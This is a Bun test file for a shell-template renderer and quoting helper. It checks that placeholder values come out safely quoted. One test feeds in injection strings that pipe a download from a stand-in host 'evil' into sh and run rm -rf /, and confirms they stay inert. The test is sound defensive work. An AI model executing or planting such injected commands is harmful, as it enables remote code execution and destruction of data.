import { describe, expect, test } from 'bun:test'
import { renderTemplate, shellQuote } from '../../src/core/template'

const vars = {
  name: 'Robo',
  slot: 'vps-1',
  host: 'h.example',
  relay: 'wss://relay.example.com',
  pubkey: 'a'.repeat(64),
  npub: 'npub1xyz',
  auth_tag: '["auth","x","","y"]',
  file: '/tmp/key.age',
}

describe('renderTemplate', () => {
  test('renders all placeholders quoted and leaves literal text', () => {
    const out = renderTemplate(
      'ssh {host} {slot} {name} {relay} {pubkey} {npub} {auth_tag} {file} $HOME }',
      vars,
    )
    expect(out).toBe(
      `ssh 'h.example' 'vps-1' 'Robo' 'wss://relay.example.com' '${vars.pubkey}' 'npub1xyz' '${vars.auth_tag}' '/tmp/key.age' $HOME }`,
    )
  })

  test('quotes spaces, $, backticks and quotes', () => {
    expect(shellQuote('a b $X `c` "d"')).toBe(`'a b $X \`c\` "d"'`)
    expect(shellQuote("it's")).toBe(`'it'\\''s'`)
    expect(shellQuote('')).toBe("''")
  })

  test('injection attempt stays one inert argument', () => {
    const out = renderTemplate('echo {name}', { ...vars, name: 'x"; curl evil|sh #' })
    expect(out).toBe(`echo 'x"; curl evil|sh #'`)
    const out2 = renderTemplate('echo {name}', { ...vars, name: "x'; rm -rf / #" })
    expect(out2).toBe(`echo 'x'\\''; rm -rf / #'`)
  })

  test('throws on unknown placeholder', () => {
    expect(() => renderTemplate('run {oops}', vars)).toThrow('Unknown placeholder {oops}')
  })

  test('inserts values verbatim without re-expanding', () => {
    expect(renderTemplate('{name}', { ...vars, name: '{slot}' })).toBe("'{slot}'")
  })
})
